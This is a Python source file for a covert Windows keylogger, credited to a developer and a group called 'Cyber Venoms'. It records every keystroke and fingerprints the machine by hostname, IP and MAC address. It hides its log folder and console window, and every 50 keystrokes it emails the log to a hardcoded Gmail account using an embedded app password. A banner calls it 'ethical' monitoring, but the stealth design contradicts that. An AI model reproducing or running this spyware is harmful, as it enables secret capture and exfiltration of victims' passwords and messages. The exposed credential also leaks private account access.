import os
import sys
import subprocess
import smtplib
import time
import threading
import socket
import uuid
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
from pynput.keyboard import Listener, Key, KeyCode

COMPUTER_NAME = socket.gethostname()
try:
    IP_ADDRESS = socket.gethostbyname(COMPUTER_NAME)
except:
    IP_ADDRESS = "127.0.0.1"

try:
    MAC_ADDRESS = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]).upper()
except:
    MAC_ADDRESS = "00:00:00:00:00:00"

CURRENT_TIME = time.strftime("%Y-%m-%d %H:%M:%S")

DATA_FOLDER = "system_data"
LOG_PATH = os.path.join(DATA_FOLDER, f"{COMPUTER_NAME}_activity_log.txt")

DEVELOPER_NAME = "M.Fahad"
ORGANIZATION = "Cyber Venoms"

# EMAIL SETTINGS
ADMIN_EMAIL = "fahadkhan03034921132@gmail.com"
ACCESS_TOKEN = "pncxugtetppcyipn"
TARGET_EMAIL = "fahadkhan03034921132@gmail.com"
STROKES_BEFORE_REPORT = 50

# Create data directory safely
try:
    os.makedirs(DATA_FOLDER, exist_ok=True)
    # Set hidden attribute
    if sys.platform == "win32":
        subprocess.check_call(["attrib", "+H", DATA_FOLDER], shell=True)
except PermissionError:
    # If folder exists but access denied, try to remove and recreate
    try:
        os.rmdir(DATA_FOLDER)
        os.makedirs(DATA_FOLDER, exist_ok=True)
        if sys.platform == "win32":
            subprocess.check_call(["attrib", "+H", DATA_FOLDER], shell=True)
    except:
        # Fallback: Use temp folder
        DATA_FOLDER = os.path.join(os.environ['TEMP'], "system_data")
        LOG_PATH = os.path.join(DATA_FOLDER, f"{COMPUTER_NAME}_activity_log.txt")
        os.makedirs(DATA_FOLDER, exist_ok=True)

if not os.path.exists(LOG_PATH):
    with open(LOG_PATH, "w", encoding="utf-8") as f:
        f.write("="*70 + "\n")
        f.write(f"🖥️  SYSTEM MONITOR - {COMPUTER_NAME}\n")
        f.write(f"📅 First Run: {CURRENT_TIME}\n")
        f.write(f"🌐 IP Address: {IP_ADDRESS}\n")
        f.write(f"🆔 MAC Address: {MAC_ADDRESS}\n")
        f.write(f"👨‍💻 Developed by: {DEVELOPER_NAME}\n")
        f.write(f"🏢 Organization: {ORGANIZATION}\n")
        f.write("🔒 Purpose: Ethical System Monitoring Only\n")
        f.write("="*70 + "\n\n")

def send_report():
    try:
        msg = MIMEMultipart()
        msg['Subject'] = f"[Report] {COMPUTER_NAME} | {IP_ADDRESS}"
        msg['From'] = ADMIN_EMAIL
        msg['To'] = TARGET_EMAIL

        body_text = f"""System Activity Report

Computer: {COMPUTER_NAME}
IP Address: {IP_ADDRESS}
MAC Address: {MAC_ADDRESS}
Report Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
Log File: {os.path.basename(LOG_PATH)}
"""
        body = MIMEText(body_text)
        msg.attach(body)

        if os.path.exists(LOG_PATH):
            with open(LOG_PATH, "rb") as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(LOG_PATH)}')
            msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(ADMIN_EMAIL, ACCESS_TOKEN)
        server.sendmail(ADMIN_EMAIL, TARGET_EMAIL, msg.as_string())
        server.quit()
    except:
        pass

def on_press(key):
    global stroke_counter
    
    try:
        char = key.char
        if char is not None:
            with open(LOG_PATH, "a", encoding="utf-8") as f:
                f.write(char)
            stroke_counter += 1
    except AttributeError:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            if key == Key.space:
                f.write(" ")
                stroke_counter += 1
            elif key == Key.enter:
                f.write("\n")
                stroke_counter += 1
            elif key == Key.backspace:
                f.write("[BKSP]")
                stroke_counter += 1
            elif key == Key.tab:
                f.write("\t")
                stroke_counter += 1
            elif key == Key.caps_lock:
                f.write("[CAPS]")
            elif isinstance(key, KeyCode):
                vk = key.vk
                if 96 <= vk <= 105:        # Number pad 0-9
                    f.write(str(vk - 96))
                    stroke_counter += 1
                elif vk == 106:            # *
                    f.write("*")
                    stroke_counter += 1
                elif vk == 107:            # +
                    f.write("+")
                    stroke_counter += 1
                elif vk == 109:            # -
                    f.write("-")
                    stroke_counter += 1
                elif vk == 110:            # .
                    f.write(".")
                    stroke_counter += 1
                elif vk == 111:            # /
                    f.write("/")
                    stroke_counter += 1

    if stroke_counter >= STROKES_BEFORE_REPORT:
        stroke_counter = 0
        threading.Thread(target=send_report).start()

def on_release(key):
    if key == Key.f9:
        import ctypes
        if ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000:
            try:
                with open(LOG_PATH, "a", encoding="utf-8") as f:
                    f.write("\n[⏹️ TERMINATED BY USER - Ctrl+F9]\n")
            except:
                pass
            threading.Thread(target=send_report).start()
            return False

if __name__ == "__main__":
    stroke_counter = 0
    
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()